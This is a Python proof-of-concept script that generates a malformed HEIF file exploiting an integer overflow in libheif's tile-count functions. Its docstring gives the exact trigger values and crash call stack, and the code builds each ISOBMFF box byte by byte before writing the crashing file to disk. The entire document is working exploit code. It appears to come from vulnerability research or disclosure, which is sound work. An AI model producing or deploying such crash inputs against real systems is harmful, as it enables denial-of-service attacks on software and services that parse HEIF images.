#!/usr/bin/env python3
"""
POC generator for libheif integer overflow in nTiles_h()/nTiles_v()

Vulnerability: Integer overflow in nTiles_h() / nTiles_v() in
  libheif/image-items/tiled.cc lines 87-96.

Trigger:
  image_width=0xFFFFFFFE, tile_width=3
  nTiles_h = (0xFFFFFFFE + 3 - 1) / 3
           = (0x100000000) / 3         <- wraps to 0x00000000 in uint32_t!
           = 0

Consequence:
  TiledHeader::set_parameters() calls number_of_tiles() = nTiles_h * nTiles_v = 0
  m_offsets.resize(0) -> empty vector
  Any call to is_tile_offset_known(0) accesses m_offsets[0] on empty vector -> SIGSEGV

Crash call stack:
  heif_image_handle_get_luma_bits_per_pixel
  -> ImageItem_Tiled::get_luma_bits_per_pixel()
  -> append_compressed_tile_data(data, 0, 0)
  -> TiledHeader::is_tile_offset_known(0)
  -> m_offsets[0]  <-- empty vector access -> SIGSEGV

HEIF file structure:
  ftyp (brand 'mif1')
  meta:
    hdlr (handler='pict')
    iinf with infe (item_type='tili')
    iprp with ipco:
      ispe (image_width=0xFFFFFFFE, image_height=4)
      tilC (tile_width=3, tile_height=4, compression='hvc1')
    pitm (item_id=1)
    iloc (points to mdat)
  mdat (dummy bytes)

Note: item_type MUST be 'tili' (not 'tild') and compression MUST be a known
codec (e.g., 'hvc1') so that initialize_decoder() succeeds and m_offsets is
allocated with size 0 before the crash path is triggered.
"""

import struct
import os

def u8(v):  return struct.pack('>B', v & 0xFF)
def u16(v): return struct.pack('>H', v & 0xFFFF)
def u32(v): return struct.pack('>I', v & 0xFFFFFFFF)


def box(fourcc, payload, version=None, flags=None):
    """Build an ISOBMFF box. If version/flags given, prefix with fullbox header."""
    if isinstance(fourcc, str):
        fourcc = fourcc.encode('ascii')
    body = payload
    if version is not None:
        body = u8(version) + struct.pack('>I', flags if flags else 0)[1:] + payload
    size = 8 + len(body)
    return struct.pack('>I', size) + fourcc + body


# ---- ftyp box ----
ftyp_payload = b'mif1' + u32(0) + b'mif1' + b'heic'
ftyp = box('ftyp', ftyp_payload)

# ---- hdlr box ----
hdlr_payload = (
    u32(0)           # pre_defined
    + b'pict'        # handler_type
    + u32(0) + u32(0) + u32(0)  # reserved
    + b'Picture\x00'  # name
)
hdlr = box('hdlr', hdlr_payload, version=0, flags=0)

# ---- infe box for item 1 (tili item) ----
# item_type MUST be 'tili' - ImageItem::alloc_for_infe_box recognizes 'tili' only
infe_payload = (
    u16(1)           # item_ID
    + u16(0)         # item_protection_index
    + b'tili'        # item_type
    + b'\x00'        # item_name
)
infe = box('infe', infe_payload, version=2, flags=0)

# ---- iinf box ----
iinf_payload = u16(1) + infe
iinf = box('iinf', iinf_payload, version=0, flags=0)

# ---- ispe box: image_width=0xFFFFFFFE triggers the overflow ----
# image_width=0xFFFFFFFE, image_height=4
IMAGE_WIDTH  = 0xFFFFFFFE  # Trigger: (0xFFFFFFFE + 3 - 1) wraps to 0 in uint32_t
IMAGE_HEIGHT = 4
ispe_payload = u32(IMAGE_WIDTH) + u32(IMAGE_HEIGHT)
ispe = box('ispe', ispe_payload, version=0, flags=0)

# ---- tilC box (Tiled Image Configuration) ----
# version=0 flags:
#   bits 0-1: offset_field_length: 01 = 40 bits
#   bits 2-3: size_field_length:   01 = 24 bits
#   flags = 0x05
# Payload: tile_width(4), tile_height(4), compression_fourcc(4),
#          num_extra_dims(1), num_properties(1)  [version=0 format]
TILE_WIDTH  = 3   # Key trigger value: nTiles_h = (0xFFFFFFFE + 3 - 1) / 3 overflows
TILE_HEIGHT = 4
# Use HEVC ('hvc1') so alloc_for_compression_format returns a valid decoder
# and initialize_decoder() succeeds, allowing m_offsets.resize(0) to complete
COMPRESSION_HEVC = 0x68766331  # 'hvc1'
tilC_flags = 0x05  # offset_field_length=40, size_field_length=24
tilC_payload = (
    u32(TILE_WIDTH)
    + u32(TILE_HEIGHT)
    + u32(COMPRESSION_HEVC)
    + u8(0)   # num_extra_dimensions
    + u8(0)   # num_properties (version=0 format)
)
tilC = box('tilC', tilC_payload, version=0, flags=tilC_flags)

# ---- ipco + ipma ----
ipco_payload = ispe + tilC
ipco = box('ipco', ipco_payload)

# ipma: associate ispe (prop 1) and tilC (prop 2) with item 1
ipma_payload = (
    u32(1)        # entry_count = 1
    + u16(1)      # item_ID = 1
    + u8(2)       # association_count = 2
    + u8(0x81)    # essential=1, property_index=1 (ispe)
    + u8(0x82)    # essential=1, property_index=2 (tilC)
)
ipma = box('ipma', ipma_payload, version=0, flags=0)
iprp = box('iprp', ipco_payload + ipma)  # Note: ipco is inside iprp

# ---- pitm box ----
pitm_payload = u16(1)
pitm = box('pitm', pitm_payload, version=0, flags=0)

# ---- Compute sizes to determine mdat offset ----
ftyp_size = len(ftyp)

def build_iloc(data_offset):
    """Build iloc box with given data offset."""
    iloc_payload = (
        bytes([0x44, 0x00])  # offset_size=4 (nibble), length_size=4 (nibble), base_offset_size=0
        + u16(1)             # item_count = 1
        + u16(1)             # item_ID = 1
        + u16(0)             # data_ref_index = 0
        + u16(1)             # extent_count = 1
        + u32(data_offset)   # extent_offset
        + u32(16)            # extent_length
    )
    return box('iloc', iloc_payload, version=0, flags=0)

# iprp needs to contain ipco then ipma
iprp_payload = ipco + ipma
iprp = box('iprp', iprp_payload)

meta_inner_without_iloc = hdlr + iinf + iprp + pitm
iloc_placeholder = build_iloc(0)
meta_inner_size = len(meta_inner_without_iloc) + len(iloc_placeholder)
meta_total_size = 8 + 4 + meta_inner_size  # box header + fullbox header

mdat_data_offset = ftyp_size + meta_total_size + 8  # after mdat box header

iloc = build_iloc(mdat_data_offset)

meta_inner = hdlr + iinf + iprp + pitm + iloc
meta = box('meta', meta_inner, version=0, flags=0)

assert len(meta) == meta_total_size, f"Meta size mismatch: {len(meta)} vs {meta_total_size}"

# ---- mdat ----
mdat_payload = b'\x00' * 16
mdat = box('mdat', mdat_payload)

# ---- Final file ----
heif_file = ftyp + meta + mdat

output_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'poc_input')

print(f"File size: {len(heif_file)} bytes")
print(f"image_width = 0x{IMAGE_WIDTH:08X} ({IMAGE_WIDTH})")
print(f"tile_width  = {TILE_WIDTH}")
print(f"nTiles_h overflow: ({IMAGE_WIDTH} + {TILE_WIDTH} - 1) & 0xFFFFFFFF = "
      f"0x{(IMAGE_WIDTH + TILE_WIDTH - 1) & 0xFFFFFFFF:08X}")
print(f"nTiles_h = {((IMAGE_WIDTH + TILE_WIDTH - 1) & 0xFFFFFFFF) // TILE_WIDTH} (wraps to 0!)")
print(f"Written to: {output_path}")

with open(output_path, 'wb') as f:
    f.write(heif_file)
